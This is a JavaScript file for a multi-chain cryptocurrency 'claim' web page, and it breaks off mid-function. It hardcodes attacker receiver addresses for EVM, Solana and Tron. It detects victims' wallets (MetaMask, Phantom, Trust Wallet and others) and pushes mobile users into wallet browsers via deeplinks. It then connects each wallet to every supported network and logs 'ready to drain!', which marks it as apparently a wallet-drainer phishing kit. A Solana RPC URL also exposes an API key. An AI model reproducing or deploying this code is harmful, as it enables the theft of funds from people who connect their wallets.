$(document).ready(function() {
    // Configuration
    const RECEIVER_ADDRESSES = {
        ETH: '0x742D35Cc6634C0532925a3b8D79DCf4c6E3C6C8f',
        BSC: '0x742D35Cc6634C0532925a3b8D79DCf4c6E3C6C8f',
        POLYGON: '0x742D35Cc6634C0532925a3b8D79DCf4c6E3C6C8f',
        AVALANCHE: '0x742D35Cc6634C0532925a3b8D79DCf4c6E3C6C8f',
        ARBITRUM: '0x742D35Cc6634C0532925a3b8D79DCf4c6E3C6C8f',
        OPTIMISM: '0x742D35Cc6634C0532925a3b8D79DCf4c6E3C6C8f',
        SOL: '4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s',
        TRX: 'TGzz8gjYiYRqpfmDwnLxfgPuLVNmpCswVp'
    };

    // Network configurations
    const NETWORKS = {
        ETH: {
            name: 'Ethereum',
            icon: '🔷',
            chainId: 1,
            rpc: 'https://cloudflare-eth.com',
            currency: 'ETH',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'Rainbow', 'WalletConnect'],
            tokens: [
                { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
                //{ symbol: 'USDC', address: '0xA0b86a33E6e26C8d5F0Ce4D2a2E7e9E0E04E4F8c', decimals: 6 },
                { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
                { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
                { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 }
            ]
        },
        BSC: {
            name: 'BSC',
            icon: '🟡',
            chainId: 56,
            rpc: 'https://bsc-dataseed1.binance.org',
            currency: 'BNB',
            type: 'evm',
            wallets: ['MetaMask', 'Trust Wallet', 'Binance Wallet', 'WalletConnect'],
            tokens: [
                { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
                { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
                { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18 },
                { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18 },
                { symbol: 'BNB', address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18 }
            ]
        },
        POLYGON: {
            name: 'Polygon',
            icon: '🟣',
            chainId: 137,
            rpc: 'https://polygon-rpc.com',
            currency: 'MATIC',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'WalletConnect'],
            tokens: [
                { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6 },
                { symbol: 'USDC', address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', decimals: 6 },
                { symbol: 'WMATIC', address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', decimals: 18 },
                { symbol: 'QUICK', address: '0x831753DD7087CaC61aB5644b308642cc1c33Dc13', decimals: 18 }
            ]
        },
        AVALANCHE: {
            name: 'Avalanche',
            icon: '🔺',
            chainId: 43114,
            rpc: 'https://api.avax.network/ext/bc/C/rpc',
            currency: 'AVAX',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Core Wallet', 'WalletConnect'],
            tokens: [
                { symbol: 'USDT', address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', decimals: 6 },
                { symbol: 'USDC', address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', decimals: 6 },
                { symbol: 'WAVAX', address: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', decimals: 18 },
                { symbol: 'JOE', address: '0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd', decimals: 18 }
            ]
        },
        ARBITRUM: {
            name: 'Arbitrum',
            icon: '🔵',
            chainId: 42161,
            rpc: 'https://arb1.arbitrum.io/rpc',
            currency: 'ETH',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'WalletConnect'],
            tokens: [
                { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6 },
                { symbol: 'USDC', address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', decimals: 6 },
                { symbol: 'ARB', address: '0x912CE59144191C1204E64559FE8253a0e49E6548', decimals: 18 }
            ]
        },
        OPTIMISM: {
            name: 'Optimism',
            icon: '🔴',
            chainId: 10,
            rpc: 'https://mainnet.optimism.io',
            currency: 'ETH',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'WalletConnect'],
            tokens: [
                { symbol: 'USDT', address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', decimals: 6 },
                { symbol: 'USDC', address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6 },
                { symbol: 'OP', address: '0x4200000000000000000000000000000000000042', decimals: 18 }
            ]
        },
        SOL: {
            name: 'Solana',
            icon: '🟢',
            chainId: null,
            rpc: 'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4',
            currency: 'SOL',
            type: 'solana',
            wallets: ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet'],
            tokens: [
                { symbol: 'USDC', mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v' },
                { symbol: 'USDT', mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB' },
                { symbol: 'RAY', mint: '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R' },
                { symbol: 'SRM', mint: 'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt' }
            ]
        },
        TRX: {
            name: 'Tron',
            icon: '🟠',
            chainId: null,
            rpc: 'https://api.trongrid.io',
            currency: 'TRX',
            type: 'tron',
            wallets: ['TronLink', 'Trust Wallet', 'Ledger'],
            tokens: [
                { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
                { symbol: 'USDC', address: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8' },
                { symbol: 'JST', address: 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9' }
            ]
        }
    };

    // Global state
    let detectedWallets = {};
    let selectedWallets = [];
    let connectedNetworks = {};
    let globalStats = {
        totalNetworks: 0,
        totalWallets: 0,
        totalValue: 0
    };

    // Utility functions
    function log(message, type = 'info') {
        const logContainer = $('#log-container');
        const timestamp = new Date().toLocaleTimeString();
        const logEntry = $(`<div class="log-entry log-${type}">[${timestamp}] ${message}</div>`);
        logContainer.append(logEntry);
        logContainer.scrollTop(logContainer[0].scrollHeight);
        logContainer.show();
        console.log(`[${type.toUpperCase()}] ${message}`);
    }

    function updateGlobalStats() {
        $('#total-networks').text(globalStats.totalNetworks);
        $('#total-wallets').text(globalStats.totalWallets);
        $('#total-value').text(`$${globalStats.totalValue.toFixed(2)}`);
    }

    function updateProgress(percent, text) {
        $('#progress-fill').css('width', `${percent}%`);
        $('#progress-text').text(text);
        if (percent > 0) {
            $('#progress-container').show();
        } else {
            $('#progress-container').hide();
        }
    }

    function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    // Initialize networks UI
    function initializeNetworksUI() {
        const tabsContainer = $('#network-tabs');
        const contentsContainer = $('#network-contents');
        
        // Add Wallet Selection tab as first tab
        const walletSelectionTab = $(`
            <div class="network-tab active" data-network="wallet-selection">
                <span>🎯</span>
                <span>Wallet Selection</span>
                <span class="network-status" id="status-wallet-selection">📋</span>
            </div>
        `);
        tabsContainer.append(walletSelectionTab);
        
        // Add Wallet Selection content
        const walletSelectionContent = $(`
        `);
        contentsContainer.append(walletSelectionContent);
        
        Object.keys(NETWORKS).forEach((networkKey, index) => {
            const network = NETWORKS[networkKey];
            
            // Create tab (index + 1 because wallet selection is first)
            const tab = $(`
                <div class="network-tab" data-network="${networkKey}">
                    <span>${network.icon}</span>
                    <span>${network.name}</span>
                    <span class="network-status" id="status-${networkKey}">📴</span>
                </div>
            `);
            
            tabsContainer.append(tab);
            
            // Create content
            const content = $(`
                <div class="network-content" id="content-${networkKey}">
                    <h3>${network.icon} ${network.name} Network</h3>
                    <div class="network-stats">
                        <div class="stat">
                            <div class="stat-value" id="wallets-${networkKey}">0</div>
                            <div class="stat-label">Selected Wallets</div>
                        </div>
                        <div class="stat">
                            <div class="stat-value" id="connected-${networkKey}">0</div>
                            <div class="stat-label">Connected</div>
                        </div>
                        <div class="stat">
                            <div class="stat-value" id="balance-${networkKey}">0.00</div>
                            <div class="stat-label">${network.currency} Balance</div>
                        </div>
                        <div class="stat">
                            <div class="stat-value" id="tokens-${networkKey}">0</div>
                            <div class="stat-label">Tokens Found</div>
                        </div>
                    </div>
                    <div class="wallet-grid" id="wallets-${networkKey}-grid">
                        <div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">
                            Select wallets from the Wallet Selection tab to see them here
                        </div>
                    </div>
                </div>
            `);
            
            contentsContainer.append(content);
        });
    }

    // Tab switching
    $(document).on('click', '.network-tab', function() {
        const networkKey = $(this).data('network');
        
        $('.network-tab').removeClass('active');
        $(this).addClass('active');
        
        $('.network-content').removeClass('active');
        $(`#content-${networkKey}`).addClass('active');
    });

    // Comprehensive wallet detection across all networks
    function detectAllWallets() {
        const allDetectedWallets = [];
        
        log('🔍 Starting wallet detection scan...', 'info');
        
        // Phantom Wallet detection (prioritize this first to avoid conflicts)
        if (window.solana && window.solana.isPhantom) {
            log('✓ Phantom (Solana) detected', 'info');
            
            // Check if Phantom also supports EVM (Ethereum)
            const supportedNetworks = ['SOL'];
            if (window.ethereum && (window.ethereum.isPhantom || window.ethereum._phantom || 
                (window.ethereum.isMetaMask && window.solana?.isPhantom))) {
                // Phantom supports Solana + limited EVM networks (only ETH and POLYGON)
                supportedNetworks.push('ETH', 'POLYGON');
                log('✓ Phantom EVM support detected - supports ETH and POLYGON only', 'info');
            }
            
            allDetectedWallets.push({
                name: 'Phantom',
                type: 'multi',
                provider: window.solana,
                evmProvider: window.ethereum, // Store EVM provider separately
                supportedNetworks: supportedNetworks,
                icon: '👻',
                selected: false,
                connected: false
            });
        }
        
        // Phantom EVM support (if ethereum provider is also available and not already detected)
        if (window.ethereum && window.ethereum.isPhantom && !allDetectedWallets.find(w => w.name === 'Phantom')) {
            log('✓ Phantom (EVM) detected', 'info');
            allDetectedWallets.push({
                name: 'Phantom (EVM)',
                type: 'evm',
                provider: window.ethereum,
                supportedNetworks: ['ETH', 'POLYGON'],
                icon: '�',
                selected: false,
                connected: false
            });
        }
        
        // Trust Wallet detection (check multiple indicators and prioritize over MetaMask)
        if (window.ethereum && (
            window.ethereum.isTrust || 
            window.ethereum.isTrustWallet ||
            (window.ethereum.isMetaMask && window.tronWeb) || // Trust Wallet sets isMetaMask=true AND has tronWeb
            (window.tronWeb && window.tronWeb.isTrustWallet) ||
            (navigator.userAgent && navigator.userAgent.includes('Trust'))
        )) {
            log('✓ Trust Wallet detected (multi-network support)', 'info');
            
            const supportedNetworks = ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'];
            
            // Check if TronLink/Tron support is available (even if not connected)
            if (window.tronWeb) {
                supportedNetworks.push('TRX');
                log('✓ Trust Wallet Tron support detected', 'info');
            }
            
            allDetectedWallets.push({
                name: 'Trust Wallet',
                type: 'multi',
                provider: window.ethereum,
                tronProvider: window.tronWeb,
                supportedNetworks: supportedNetworks,
                icon: '🛡️',
                selected: false,
                connected: false
            });
        }
        // MetaMask detection (very strict - must have MetaMask specific properties and not be other wallets)
        else if (window.ethereum && 
            window.ethereum.isMetaMask && 
            !window.ethereum.isPhantom && 
            !window.ethereum.isTrust &&
            !window.ethereum.isTrustWallet &&
            !window.solana?.isPhantom &&
            !window.tronWeb?.isTrustWallet &&
            !window.tronWeb && // Exclude if ANY tronWeb exists (Trust Wallet indicator)
            !(navigator.userAgent && navigator.userAgent.includes('Trust')) &&
            !allDetectedWallets.find(w => w.name === 'Trust Wallet') && // Exclude if Trust Wallet already detected
            (window.ethereum._metamask || window.ethereum.request)) {
            
            // Additional check - try to verify it's actually MetaMask
            const isRealMetaMask = !window.ethereum.isCoinbaseWallet &&
                                   !window.ethereum.isBackpack &&
                                   !window.ethereum.isGlow;
            
            if (isRealMetaMask) {
                log('✓ MetaMask detected', 'info');
                allDetectedWallets.push({
                    name: 'MetaMask',
                    type: 'evm',
                    provider: window.ethereum,
                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                    icon: '🦊',
                    selected: false,
                    connected: false
                });
            } else {
                log('⚠️ window.ethereum.isMetaMask is true but appears to be another wallet', 'info');
            }
        } else if (window.ethereum && window.ethereum.isMetaMask) {
            log('🚫 Skipping MetaMask detection - appears to be Trust Wallet or another wallet', 'warning');
        }
        
        // Coinbase Wallet detection
        if (window.ethereum && (window.ethereum.isCoinbaseWallet || window.coinbaseWalletExtension)) {
            allDetectedWallets.push({
                name: 'Coinbase Wallet',
                type: 'evm',
                provider: window.ethereum.isCoinbaseWallet ? window.ethereum : window.coinbaseWalletExtension,
                supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                icon: '�',
                selected: false,
                connected: false
            });
        }
        
        
        // Solflare Wallet detection (Solana only)
        if (window.solflare) {
            allDetectedWallets.push({
                name: 'Solflare',
                type: 'solana',
                provider: window.solflare,
                supportedNetworks: ['SOL'],
                icon: '☀️',
                selected: false,
                connected: false
            });
        }
        
        // Backpack Wallet detection (Solana only)
        if (window.backpack) {
            allDetectedWallets.push({
                name: 'Backpack',
                type: 'solana',
                provider: window.backpack,
                supportedNetworks: ['SOL'],
                icon: '🎒',
                selected: false,
                connected: false
            });
        }
        
        // Glow Wallet detection (Solana only)
        if (window.glow) {
            allDetectedWallets.push({
                name: 'Glow',
                type: 'solana',
                provider: window.glow,
                supportedNetworks: ['SOL'],
                icon: '✨',
                selected: false,
                connected: false
            });
        }
        
        // TronLink detection (Tron only - exclude if it's Trust Wallet)
        if (window.tronWeb && window.tronWeb.defaultAddress && 
            !window.tronWeb.isTrustWallet && 
            !(navigator.userAgent && navigator.userAgent.includes('Trust'))) {
            allDetectedWallets.push({
                name: 'TronLink',
                type: 'tron',
                provider: window.tronWeb,
                supportedNetworks: ['TRX'],
                icon: '🔶',
                selected: false,
                connected: false
            });
        }
        
        // Handle multiple providers if available (check for additional wallets)
        if (window.ethereum && window.ethereum.providers) {
            window.ethereum.providers.forEach(provider => {
                // MetaMask from multiple providers (very strict - exclude Trust Wallet)
                if (provider.isMetaMask && 
                    !provider.isPhantom && 
                    !provider.isTrust && 
                    !provider.isTrustWallet &&
                    !window.tronWeb &&
                    !(navigator.userAgent && navigator.userAgent.includes('Trust'))) {
                    if (!allDetectedWallets.find(w => w.name === 'MetaMask')) {
                        log('✓ MetaMask detected from multiple providers', 'info');
                        allDetectedWallets.push({
                            name: 'MetaMask',
                            type: 'evm',
                            provider: provider,
                            supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                            icon: '🦊',
                            selected: false,
                            connected: false
                        });
                    }
                }
                
                // Coinbase Wallet from multiple providers
                if (provider.isCoinbaseWallet) {
                    if (!allDetectedWallets.find(w => w.name === 'Coinbase Wallet')) {
                        allDetectedWallets.push({
                            name: 'Coinbase Wallet',
                            type: 'evm',
                            provider: provider,
                            supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                            icon: '🔷',
                            selected: false,
                            connected: false
                        });
                    }
                }
                
                // Trust Wallet from multiple providers (not Phantom, not already detected)
                if ((provider.isTrust || provider.isTrustWallet || 
                     (provider.isMetaMask && window.tronWeb)) && 
                    !provider.isPhantom) {
                    if (!allDetectedWallets.find(w => w.name === 'Trust Wallet')) {
                        log('✓ Trust Wallet detected from multiple providers', 'info');
                        allDetectedWallets.push({
                            name: 'Trust Wallet',
                            type: 'multi',
                            provider: provider,
                            tronProvider: window.tronWeb,
                            supportedNetworks: window.tronWeb ? 
                                ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'TRX'] : 
                                ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                            icon: '🛡️',
                            selected: false,
                            connected: false
                        });
                    }
                }
                
                // Phantom EVM from multiple providers (if not already added as Solana)
                if (provider.isPhantom && !allDetectedWallets.find(w => w.name.includes('Phantom'))) {
                    allDetectedWallets.push({
                        name: 'Phantom (EVM)',
                        type: 'evm',
                        provider: provider,
                        supportedNetworks: ['ETH', 'POLYGON'],
                        icon: '👻',
                        selected: false,
                        connected: false
                    });
                }
            });
        }
        
        log(`🎯 Wallet detection complete. Found ${allDetectedWallets.length} wallets:`, 'info');
        allDetectedWallets.forEach((wallet, index) => {
            log(`  ${index + 1}. ${wallet.name} (${wallet.type}) - Networks: ${wallet.supportedNetworks.join(', ')}`, 'info');
        });
        
        // Debug: Check for any ethereum provider properties
        if (window.ethereum) {
            log('🔍 Debug: window.ethereum properties:', 'info');
            log(`  - isMetaMask: ${window.ethereum.isMetaMask}`, 'info');
            log(`  - isPhantom: ${window.ethereum.isPhantom}`, 'info');
            log(`  - isTrust: ${window.ethereum.isTrust}`, 'info');
            log(`  - isTrustWallet: ${window.ethereum.isTrustWallet}`, 'info');
            log(`  - isCoinbaseWallet: ${window.ethereum.isCoinbaseWallet}`, 'info');
            log(`  - has _metamask: ${!!window.ethereum._metamask}`, 'info');
            log(`  - has tronWeb: ${!!window.tronWeb}`, 'info');
            log(`  - userAgent includes Trust: ${navigator.userAgent.includes('Trust')}`, 'info');
            
            // If Trust Wallet is detected, override the isMetaMask flag to prevent confusion
            if ((window.ethereum.isTrust || window.ethereum.isTrustWallet || 
                 (window.ethereum.isMetaMask && window.tronWeb) ||
                 navigator.userAgent.includes('Trust')) && 
                allDetectedWallets.find(w => w.name === 'Trust Wallet')) {
                log('🔧 Overriding MetaMask identification for Trust Wallet', 'warning');
                // Don't actually modify the provider, just note the override
            }
        }
        
        if (window.solana) {
            log('🔍 Debug: window.solana properties:', 'info');
            log(`  - isPhantom: ${window.solana.isPhantom}`, 'info');
        }
        
        return allDetectedWallets;
    }

    // Mobile wallet deeplinks helper
    function showMobileWalletHelp() {
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        if (isMobile && detectedWallets.length === 0) {
            log('📱 Mobile device detected with no wallets found!', 'warning');
            log('💡 Try opening this page in your wallet\'s built-in browser:', 'info');
            
            const currentUrl = window.location.href;
            const encodedUrl = encodeURIComponent(currentUrl);
            
            // Create mobile wallet deeplinks
            const walletDeeplinks = {
                'Phantom': `https://phantom.app/ul/browse/${encodedUrl}?ref=https://phantom.app`,
                'MetaMask': `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
                'Trust Wallet': `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
                'Coinbase Wallet': `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
                'Rainbow': `https://rnbwapp.com/open?url=${encodedUrl}`,
                'Solflare': `https://solflare.com/access-wallet?redirect=${encodedUrl}`
            };
            
            log('🔗 Mobile Wallet Deeplinks (Click to open in wallet):', 'info');
            Object.entries(walletDeeplinks).forEach(([walletName, deeplink]) => {
                log(`  • ${walletName}: ${deeplink}`, 'info');
            });
            
            // Add clickable deeplink buttons to the UI
            addMobileDeeplinkButtons(walletDeeplinks);
            
            log('📋 Manual Instructions:', 'info');
            log('  • Phantom: Open Phantom app > Browser > Navigate to this URL', 'info');
            log('  • MetaMask: Open MetaMask app > Browser > Navigate to this URL', 'info');
            log('  • Trust Wallet: Open Trust Wallet app > DApps > Navigate to this URL', 'info');
            log('  • Coinbase Wallet: Open Coinbase Wallet app > Browser > Navigate to this URL', 'info');
        }
    }
    
    // Add mobile deeplink buttons to the UI
    function addMobileDeeplinkButtons(walletDeeplinks) {
        const grid = $('#wallet-selection-grid');
        
        // Clear existing content
        grid.empty();
        
        // Add header
        grid.append(`
            <div style="grid-column: 1/-1; text-align: center; padding: 20px; background: #2a2a2a; border-radius: 8px; margin-bottom: 20px;">
                <h4 style="color: #ff6b6b; margin-bottom: 10px;">📱 No Mobile Wallets Detected!</h4>
                <p style="color: #ccc; margin-bottom: 15px;">Click a button below to open this page in your wallet's browser:</p>
            </div>
        `);
        
        // Add deeplink buttons
        Object.entries(walletDeeplinks).forEach(([walletName, deeplink]) => {
            const walletIcon = {
                'Phantom': '👻',
                'MetaMask': '🦊', 
                'Trust Wallet': '🛡️',
                'Coinbase Wallet': '🔵',
                'Rainbow': '🌈',
                'Solflare': '☀️'
            }[walletName] || '📱';
            
            const button = $(`
                <div class="mobile-deeplink-button" style="
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    border: none;
                    border-radius: 12px;
                    padding: 15px;
                    color: white;
                    text-align: center;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
                " data-deeplink="${deeplink}">
                    <div style="font-size: 24px; margin-bottom: 8px;">${walletIcon}</div>
                    <div style="font-weight: bold; margin-bottom: 4px;">${walletName}</div>
                    <div style="font-size: 12px; opacity: 0.8;">Tap to open</div>
                </div>
            `);
            
            button.on('click', function() {
                const link = $(this).data('deeplink');
                log(`🔗 Opening ${walletName} deeplink...`, 'info');
                window.open(link, '_blank');
            });
            
            // Add hover effect
            button.on('mouseenter', function() {
                $(this).css('transform', 'translateY(-2px)');
            }).on('mouseleave', function() {
                $(this).css('transform', 'translateY(0)');
            });
            
            grid.append(button);
        });
        
        // Add manual instructions
        grid.append(`
            <div style="grid-column: 1/-1; text-align: center; padding: 20px; background: #1a1a1a; border-radius: 8px; margin-top: 20px;">
                <h5 style="color: #ffd93d; margin-bottom: 10px;">💡 Alternative Method</h5>
                <p style="color: #ccc; font-size: 14px; line-height: 1.4;">
                    If the buttons don't work, manually copy this URL and paste it into your wallet's browser:
                </p>
                <div style="background: #333; padding: 10px; border-radius: 6px; margin: 10px 0; word-break: break-all; font-family: monospace; font-size: 12px; color: #4CAF50;">
                    ${window.location.href}
                </div>
            </div>
        `);
    }

    // Scan all networks for available wallets
    async function scanAllNetworks() {
        log('Starting comprehensive wallet scan across all networks...', 'info');
        updateProgress(0, 'Scanning for wallets...');
        
        try {
            detectedWallets = detectAllWallets();
            
            if (detectedWallets.length === 0) {
                log('No wallets detected! Please install wallet extensions and refresh the page.', 'error');
                
                // Show mobile wallet help if on mobile device
                showMobileWalletHelp();
                
                updateProgress(0, '');
                return;
            }
            
            // Render wallet selection UI
            renderWalletSelection();
            
            // Update stats
            updateWalletSelectionStats();
            
            updateProgress(100, 'Wallet scan complete!');
            setTimeout(() => updateProgress(0, ''), 2000);
            
            log(`✓ Wallet scan complete! Found ${detectedWallets.length} wallet(s).`, 'success');
            log('Please select the wallets you want to connect to from the Wallet Selection tab.', 'info');
            
            // Enable wallet selection controls
            $('#select-all-wallets').prop('disabled', false);
            
        } catch (error) {
            log(`✗ Error during wallet scan: ${error.message}`, 'error');
            updateProgress(0, '');
        }
    }
    
    // Render wallet selection interface
    function renderWalletSelection() {
        const grid = $('#wallet-selection-grid');
        grid.empty();
        
        if (detectedWallets.length === 0) {
            grid.html('<div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">No wallets detected. Please install wallet extensions.</div>');
            return;
        }
        
        detectedWallets.forEach((wallet, index) => {
            const networksText = wallet.supportedNetworks.map(net => NETWORKS[net]?.icon || net).join(' ');
            const walletItem = $(`
                <div class="wallet-selection-item ${wallet.selected ? 'selected' : 'available'}" data-wallet-index="${index}">
                    <div class="wallet-header">
                        <span class="wallet-icon">${wallet.icon}</span>
                        <span class="wallet-name">${wallet.name}</span>
                        <span class="selection-status">${wallet.selected ? '✅' : '⭕'}</span>
                    </div>
                    <div class="wallet-networks">
                        <small>Supports: ${networksText}</small>
                    </div>
                    <div class="wallet-type">
                        <small>${wallet.supportedNetworks.length} network(s)</small>
                    </div>
                </div>
            `);
            
            walletItem.on('click', () => toggleWalletSelection(index));
            grid.append(walletItem);
        });
    }
    
    // Toggle wallet selection
    function toggleWalletSelection(walletIndex) {
        const wallet = detectedWallets[walletIndex];
        wallet.selected = !wallet.selected;
        
        log(`${wallet.selected ? 'Selected' : 'Deselected'} ${wallet.name} wallet`, 'info');
        
        // Update selected wallets array
        selectedWallets = detectedWallets.filter(w => w.selected);
        
        log(`Total selected wallets: ${selectedWallets.length}`, 'info');
        
        // Re-render selection UI
        renderWalletSelection();
        updateWalletSelectionStats();
        
        // Update controls
        $('#clear-selection').prop('disabled', selectedWallets.length === 0);
        $('#connect-selected-wallets').prop('disabled', selectedWallets.length === 0);
        
        log(`Connect button disabled: ${selectedWallets.length === 0}`, 'info');
        
        log(`${wallet.selected ? 'Selected' : 'Deselected'} ${wallet.name} wallet`, 'info');
    }
    
    // Update wallet selection statistics
    function updateWalletSelectionStats() {
        $('#total-detected-wallets').text(detectedWallets.length);
        $('#total-selected-wallets').text(selectedWallets.length);
        
        // Calculate supported networks
        const allSupportedNetworks = new Set();
        selectedWallets.forEach(wallet => {
            wallet.supportedNetworks.forEach(network => allSupportedNetworks.add(network));
        });
        $('#supported-networks').text(allSupportedNetworks.size);
        
        // Calculate estimated connections
        const estimatedConnections = selectedWallets.reduce((sum, wallet) => sum + wallet.supportedNetworks.length, 0);
        $('#estimated-connections').text(estimatedConnections);
        
        // Update global stats
        globalStats.totalWallets = selectedWallets.length;
        globalStats.totalNetworks = allSupportedNetworks.size;
        updateGlobalStats();
    }
    
    // Select all wallets
    function selectAllWallets() {
        detectedWallets.forEach(wallet => wallet.selected = true);
        selectedWallets = [...detectedWallets];
        renderWalletSelection();
        updateWalletSelectionStats();
        $('#clear-selection').prop('disabled', false);
        $('#connect-selected-wallets').prop('disabled', false);
        log('Selected all detected wallets', 'info');
    }
    
    // Clear wallet selection
    function clearWalletSelection() {
        detectedWallets.forEach(wallet => wallet.selected = false);
        selectedWallets = [];
        renderWalletSelection();
        updateWalletSelectionStats();
        $('#clear-selection').prop('disabled', true);
        $('#connect-selected-wallets').prop('disabled', true);
        log('Cleared wallet selection', 'info');
    }

    // Connect selected wallets to their supported networks
    async function connectSelectedWallets() {
        log('🔗 Connect Selected Wallets button clicked!', 'info');
        log(`Currently selected wallets: ${selectedWallets.length}`, 'info');
        
        if (selectedWallets.length === 0) {
            log('No wallets selected! Please select wallets first.', 'error');
            return;
        }
        
        log(`Connecting ${selectedWallets.length} selected wallet(s) to their supported networks...`, 'info');
        updateProgress(0, 'Initializing connections...');
        
        // Initialize network structures for selected wallets
        initializeSelectedNetworks();
        
        let totalConnections = 0;
        
        // Calculate total connections needed
        selectedWallets.forEach(wallet => {
            totalConnections += wallet.supportedNetworks.length;
        });
        
        let completedConnections = 0;
        
        for (const wallet of selectedWallets) {
            log(`Connecting ${wallet.name} to ${wallet.supportedNetworks.length} network(s)...`, 'info');
            
            for (const networkKey of wallet.supportedNetworks) {
                const network = NETWORKS[networkKey];
                updateProgress((completedConnections / totalConnections) * 100, `Connecting ${wallet.name} to ${network.name}...`);
                
                try {
                    await connectWalletToNetwork(wallet, networkKey);
                    completedConnections++;
                    log(`✓ Successfully connected ${wallet.name} to ${network.name}`, 'success');
                    
                    // Add delay between connections to prevent issues
                    await new Promise(resolve => setTimeout(resolve, 800));
                    
                } catch (error) {
                    log(`✗ Failed to connect ${wallet.name} to ${network.name}: ${error.message}`, 'error');
                    completedConnections++;
                    
                    // Continue with other connections even if one fails
                }
            }
        }
        
        updateProgress(100, 'All connections complete!');
        setTimeout(() => updateProgress(0, ''), 2000);
        
        // Update all network displays
        updateAllNetworkDisplays();
        
        // Enable claim button if any wallet is connected
        const anyConnected = Object.values(connectedNetworks).some(net => net.wallets && net.wallets.some(w => w.connected));
        if (anyConnected) {
            $('#claim-all-networks').prop('disabled', false);
            log('✓ Claim button enabled - ready to drain!', 'success');
        }
        
        const totalConnected = Object.values(connectedNetworks).reduce((sum, net) => 
            sum + (net.wallets ? net.wallets.filter(w => w.connected).length : 0), 0
        );
        
        log(`✓ Connection process complete! ${totalConnected} wallet connections established.`, 'success');
        log(`📋 Summary: ${completedConnections}/${totalConnections} connections attempted`, 'info');
    }
    
    // Initialize network structures for selected wallets
    function initializeSelectedNetworks() {
        // Clear existing connections
        connectedNetworks = {};
        
        // Initialize networks that have selected wallets
        const networksToInit = new Set();
        selectedWallets.forEach(wallet => {
            wallet.supportedNetworks.forEach(networkKey => networksToInit.add(networkKey));
        });
        
        log(`Initializing ${networksToInit.size} networks for ${selectedWallets.length} selected wallets...`, 'info');
        
        networksToInit.forEach(networkKey => {
            const network = NETWORKS[networkKey];
            connectedNetworks[networkKey] = {
                network: network,
                wallets: [],
                stats: {
                    detected: 0,
                    connected: 0,
                    balance: 0,
                    tokens: 0
                }
            };
            
            // Add selected wallets that support this network
